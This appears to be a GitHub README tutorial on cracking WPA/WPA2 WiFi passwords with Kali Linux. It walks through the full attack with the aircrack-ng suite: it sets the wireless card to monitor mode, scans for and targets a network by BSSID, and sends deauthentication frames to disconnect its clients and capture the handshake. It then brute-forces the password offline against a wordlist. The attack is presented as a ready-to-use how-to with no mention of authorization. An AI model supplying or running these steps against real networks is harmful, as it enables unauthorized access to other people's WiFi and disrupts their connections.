# How to Hack WPA/WPA2 WiFi Using Kali Linux?
 
*  **“Hacking Wifi” sounds really cool and interesting. But actually hacking wifi practically is much easier with a good wordlist. But this world list is of no use until we don’t have any idea of how to actually use that word list in order to crack a hash. And before cracking the hash we actually need to generate it. So, below are those steps along with some good wordlists to crack a WPA/WPA2 wifi.**
 
 # Explanation:
 
 * So, boot up Kali Linux. Open the terminal window. And perform the following steps.
 
 ## Step:1
 
 * ifconfig(interface configuration) : To view or change the configuration of the network interfaces on your system.
 
 <img width="401" alt="image" src="https://user-images.githubusercontent.com/104230071/197165166-ffeb0a07-2958-4991-8132-48df292d4ac3.png">

## Here

* **eth0 : First Ethernet interface**
* l0 : Loopback interface
**wlan0 : First wireless network interface on the system. (This is what we need.)**

# Step 2: Stop the current processes which are using the WiFi interface.

* airmon-ng check kill

* ![image](https://user-images.githubusercontent.com/104230071/197166016-d8e2c146-23c1-4e36-af71-6d1d3db6b737.png)

# Step 3: To start the wlan0 in monitor mode.
* airmon-ng start wlan0

![image](https://user-images.githubusercontent.com/104230071/197166236-57899937-6a15-48d1-8eb1-9bb1106dd714.png)

# Step 4: To view all the Wifi networks around you.
* airodump-ng wlan0mon

![image](https://user-images.githubusercontent.com/104230071/197166487-0c812da7-2a82-43ae-8d76-a8b454534212.png)

## Here

* airodump-ng : For packet capturing
* wlan0mon : Name of the interface (This name can be different on the different devices)
**Press Ctrl+C to stop the process when you have found the target network.**

# Step 5: To view the clients connected to the target network.
* airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root wlan0mon

![image](https://user-images.githubusercontent.com/104230071/197166866-f7987769-c65e-41b6-b688-13eade0c97b5.png)

## Here

* airodump-ng : For packet capturing
* -c : Channel
* –bssid : MAC address of a wireless access point(WAP).
* -w : The Directory where you want to save the file(Password File).
* wlan0mon : Name of the interface.

# Step 6: Open a new terminal window to disconnect the clients connected to the target network.
* aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon

![image](https://user-images.githubusercontent.com/104230071/197167144-da83f81d-b30c-43f2-98a3-1183ef624f16.png)

* aireplay-ng : To inject frames
* -0 : For deauthentication
* 10 : No. of deauthentication packets to be sent
* -a : For the bssid of the target network
* wlan0mon : Name of the interface.
**When the client is disconnected from the target network. He tries to reconnect to the network and when he does you will get something called WPA handshake in the previous window of the terminal.**

![image](https://user-images.githubusercontent.com/104230071/197167374-2b9f7f21-c9b3-4a5f-b12c-1a5bb3e042a7.png)

# Step 7. To decrypt the password. Open the Files application.

![image](https://user-images.githubusercontent.com/104230071/197167534-ae13567a-1685-4a79-9d79-a1df2ea30df2.png)

## Here

* hacking-01.cap is the file you need.
* aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /root/passwords.txt /root/hacking-01.cap
* aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
* -a : -a2 for WPA2 & -a for WPA network
* -b : The BSSID of the target network
* -w : Location of the wordlist file
* /root/hacking-01.cap : Location of the cap file
**You can download the file of common passwords from the internet and if you want to create your own file then you can use the crunch tool**

![image](https://user-images.githubusercontent.com/104230071/197167835-58cae4c6-52dc-42a2-81e1-3ce1caa98cbc.png)




 
